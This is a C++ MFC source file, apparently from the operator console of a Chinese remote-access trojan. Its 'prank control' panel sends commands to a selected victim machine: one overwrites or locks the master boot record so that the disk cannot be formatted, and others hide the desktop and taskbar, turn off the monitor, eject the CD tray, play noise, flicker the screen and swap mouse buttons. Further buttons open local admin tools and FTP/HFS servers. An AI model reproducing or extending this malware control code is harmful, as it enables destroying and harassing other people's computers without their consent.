// Play.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Play.h"
#include "ClientView.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CPlay
extern CClientView* g_pTabView;
IMPLEMENT_DYNCREATE(CPlay, CFormView)

CPlay::CPlay()
	: CFormView(CPlay::IDD)
{
	//{{AFX_DATA_INIT(CPlay)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}

CPlay::~CPlay()
{
}

void CPlay::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPlay)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CPlay, CFormView)
	//{{AFX_MSG_MAP(CPlay)
	ON_BN_CLICKED(IDC_YINGPAN, OnKillMBR)
	ON_BN_CLICKED(IDC_ZHUOMIAN1, OnZhuoMian1)
	ON_BN_CLICKED(IDC_ZHUOMIAN2, OnZhuoMian2)
	ON_BN_CLICKED(IDC_RENWULAN1, OnRenWuLan1)
	ON_BN_CLICKED(IDC_RENWULAN2, OnRenWuLan2)
	ON_BN_CLICKED(IDC_XIANSHIQI1, OnXianShiQi1)
	ON_BN_CLICKED(IDC_XIANSHIQI2, OnXianShiQi2)
	ON_BN_CLICKED(IDC_GUANGQU1, OnGuangQu1)
	ON_BN_CLICKED(IDC_GUANGQU2, OnGuangQu2)
	ON_BN_CLICKED(IDC_ZAOYIN, OnZaoYin)
	ON_BN_CLICKED(IDC_SHANPING, OnShanPing)
	ON_BN_CLICKED(IDC_MOUSE1, OnMouse1)
	ON_BN_CLICKED(IDC_MOUSE2, OnMouse2)
	ON_BN_CLICKED(IDC_FTP, OnFTPServer)
	ON_BN_CLICKED(IDC_HFS, OnHFSServer)
	ON_BN_CLICKED(IDC_JSQ, OnButton1)
	ON_BN_CLICKED(IDC_CMD, OnButton2)
	ON_BN_CLICKED(IDC_JSB, OnButton3)
	ON_BN_CLICKED(IDC_jtgj, OnButton4)
	ON_BN_CLICKED(IDC_BUTTON5, OnButton5)
	ON_BN_CLICKED(IDC_BUTTON6, OnButton6)
	ON_BN_CLICKED(IDC_BUTTON7, OnButton7)
	ON_BN_CLICKED(IDC_BUTTON8, OnButton8)
	ON_BN_CLICKED(IDC_BUTTON9, OnButton9)
	ON_BN_CLICKED(IDC_BUTTON10, OnButton10)
	ON_BN_CLICKED(IDC_BUTTON11, OnButton11)
	ON_BN_CLICKED(IDC_BUTTON12, OnButton12)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPlay diagnostics

#ifdef _DEBUG
void CPlay::AssertValid() const
{
	CFormView::AssertValid();
}

void CPlay::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPlay message handlers

void CPlay::OnKillMBR()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	if (MessageBox("硬盘加锁后将无法格式化，确定吗?", "警告", MB_YESNO|MB_ICONWARNING) == IDNO)
		return;
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_KILLMBR;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnZhuoMian1()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_ZHUOMIAN1;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));	
}

void CPlay::OnZhuoMian2()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_ZHUOMIAN2;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnRenWuLan1()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_RENWULAN1;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnRenWuLan2()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_RENWULAN2;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnXianShiQi1()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_XIANSHIQI1;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnXianShiQi2()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_XIANSHIQI2;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnGuangQu1()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_GUANGQU1;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnGuangQu2()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_GUANGQU2;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));	
}

void CPlay::OnZaoYin()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_ZAOYIN;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnShanPing()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_SHANPIN;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnMouse1()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_MOUSE1;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnMouse2()
{
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	// TODO: Add your control notification handler code here
	BYTE	lpPacket[2];
	lpPacket[0] = COMMAND_PRANK_CONTROL;
	lpPacket[1] = COMMAND_MOUSE2;
	pView->SendSelectCommand((LPBYTE)&lpPacket, sizeof(lpPacket));
}

void CPlay::OnFTPServer()
{
	// TODO: Add your control notification handler code here
	char szFilePath[MAX_PATH]={NULL};
	strcat(szFilePath,((CClientApp *)AfxGetApp())->AppPath);
	strcat(szFilePath,"\\Plugins\\FTPServer.exe");
	
	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(szFilePath))
	{
		MessageBox("FTPServer.exe文件丢失！无法启动FTP服务器！","警告",MB_ICONWARNING);
		return;
	}
	
    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //打开程序
}

void CPlay::OnHFSServer()
{
	// TODO: Add your control notification handler code here
	char szFilePath[MAX_PATH]={NULL};
	strcat(szFilePath,((CClientApp *)AfxGetApp())->AppPath);
	strcat(szFilePath,"\\Plugins\\HFS.exe");
	
	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(szFilePath))
	{
		MessageBox("hfs.exe文件丢失！无法启动hfs服务器！","警告",MB_ICONWARNING);
		return;
	}
	
    ShellExecute(NULL,"open",szFilePath,NULL,NULL,SW_SHOW);   //打开程序
}

void CPlay::OnButton1()  //计算器
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","calc.exe",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton2()  //CMD
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","cmd.exe",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton3()  //记事本
{
	// TODO: Add your control notification handler code here
	ShellExecute(0, NULL,"notepad.exe",NULL,NULL, SW_SHOW);
}

void CPlay::OnButton4()  //截图工具
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","snippingtool.exe",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton5()  //注册表
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","regedit.exe",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton6()  //远程桌面
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","mstsc.exe",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton7()  //安全策略
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,NULL,"secpol.msc",NULL,NULL,5);
}

void CPlay::OnButton8()  //组策略
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","gpedit.msc",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton9()  //计算机管理
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","compmgmt.msc",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton10() //服务管理
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","services.msc",NULL,NULL,SW_SHOW);
}

void CPlay::OnButton11() //事件管理
{
	// TODO: Add your control notification handler code here
	ShellExecute(0, NULL,"eventvwr.msc",NULL,NULL, SW_SHOW);
}

void CPlay::OnButton12() //任务计划
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","taskschd.msc",NULL,NULL,SW_SHOW);
}
